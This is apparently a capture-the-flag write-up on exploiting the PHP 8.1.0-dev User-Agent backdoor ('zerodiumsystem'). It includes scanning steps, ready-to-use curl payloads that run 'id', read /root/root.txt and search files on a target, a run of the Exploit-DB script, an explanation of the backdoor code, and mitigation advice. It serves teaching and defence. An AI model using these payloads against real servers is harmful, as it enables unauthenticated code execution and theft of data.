# PHP 8.1.0-dev Backdoor: Remote Code Execution

**Target:** PHP CLI development server, port 80
**Vulnerability:** Backdoor in the PHP 8.1.0-dev source tree (`zerodiumsystem`)
**Impact:** Unauthenticated remote code execution as the web server user
**Exploit reference:** Searchsploit `php/webapps/49933.py` (verify with `searchsploit -x`)

---

## Summary

The PHP 8.1.0-dev source tree contained a backdoor added to the official Git repository in March 2021. The change was reverted within hours, but any server built from that snapshot still has the code. The backdoor checks the HTTP `User-Agent` header for the string `zerodiumsystem(`. When it finds one, it passes the text inside the parentheses to `zend_eval_string()`, which runs it as PHP code. An attacker can therefore run commands on the server by sending a crafted header, with no login required.

---

## Reconnaissance

### Port scan

```bash
nmap -sV -p- <TARGET_IP>
```

Result: only port **80** is open. The service banner identifies the server as a PHP CLI development server, version 8.1.0-dev.

### Searching for a known exploit

```bash
searchsploit "PHP 8.1.0-dev"
searchsploit -x php/webapps/49933.py
```

Result: `PHP 8.1.0-dev - Backdoor Remote Code Execution`. The `-x` flag shows the exploit source, which lets you confirm what it sends before running it.

---

## Exploitation

### Confirming the backdoor

The simplest test is a single request with the malicious `User-Agent` header:

```bash
curl -s http://<TARGET_IP>/ -A "zerodiumsystem('system(\"id\");');"
```

| Part | Purpose |
|------|---------|
| `-s` | Silent mode, so curl doesn't show progress output |
| `-A` | Sets the `User-Agent` header |
| `zerodiumsystem('...')` | The trigger string the backdoor looks for |
| `system("id");` | The PHP code the backdoor executes |

If the response includes output such as `uid=33(www-data) gid=33(www-data)`, the server is executing your code.

### Running the searchsploit exploit

```bash
python3 49933.py <TARGET_IP> 80
```

The script sends the same kind of header with a command of its choice and prints the output. Use it to get an interactive shell or to run commands. Read the script first and confirm it only connects to the lab target.

### Reading the flag

Once you have command execution, locate and read the flag:

```bash
curl -s http://<TARGET_IP>/ -A "zerodiumsystem('system(\"cat /root/root.txt\");');"
```

Replace the path with the flag location on the box. If you don't know it yet, search with:

```bash
curl -s http://<TARGET_IP>/ -A "zerodiumsystem('system(\"find / -name '*.txt' 2>/dev/null | head -50\");');"
```

---

## Code Explanation

The core of the backdoor is a check on the request headers followed by a call to PHP's internal evaluator. In simplified form:

```c
/* Simplified from the backdoored PHP source */
if (strstr(user_agent, "zerodiumsystem(") != NULL) {
    zend_eval_string(user_agent_argument, ...);
}
```

| Part | What it does |
|------|--------------|
| `user_agent` | The `User-Agent` header from the incoming HTTP request. The attacker controls this value completely. |
| `strstr(...)` | Searches for the trigger string. A match means the request is from the attacker. |
| `zend_eval_string(...)` | PHP's internal function for executing a string as PHP source code. Anything passed to it runs with the server's permissions. |

The exploit's job is to put valid PHP code inside the trigger, such as `system("id")`. Because the code runs inside the PHP engine, it can call any function the server process can call: `system`, `exec`, `file_get_contents`, and so on.

### Why this is serious

- **No authentication:** The check happens before any application logic, so it applies to every request.
- **Untrusted input executed as code:** Header values are treated as trusted data by the backdoor.
- **Runs as the web server user:** The attacker gets the same privileges as the PHP process, which is often enough to read the web root and application secrets.

---

## Why It Worked

1. The server ran a development build of PHP 8.1.0-dev, which contained the backdoor.
2. The PHP CLI server accepted requests from any client.
3. The backdoor trusted the `User-Agent` header and executed its contents.
4. No authentication or input validation stood in the way.

---

## Mitigation

- **Use an official, released PHP version.** Development snapshots shouldn't run on production or exposed servers. Check the PHP release notes and checksums before installing.
- **Don't expose the PHP CLI server.** `php -S` is for local development only. Use Apache, Nginx, or PHP-FPM behind a proper web server.
- **Verify source integrity.** Compare builds against signed releases and known hashes, especially for development branches.
- **Monitor and restrict outbound behavior.** Alert on unexpected child processes from the PHP process, such as `sh` or `bash`.
- **Patch and rebuild after an incident.** Replace the binary, rotate any credentials the server could read, and review logs for the `zerodiumsystem` string.

---

## Key Takeaways

- Searchsploit is a fast way to match a service version to a known exploit, but read the code before running it.
- A `User-Agent` header is attacker-controlled data. Never execute anything derived from it.
- Development builds and CLI servers are common sources of exposed, unhardened services in CTF labs and real environments.
- Reference: [PHP 8.1.0-dev backdoor on Exploit-DB](https://www.exploit-db.com/exploits/49933)
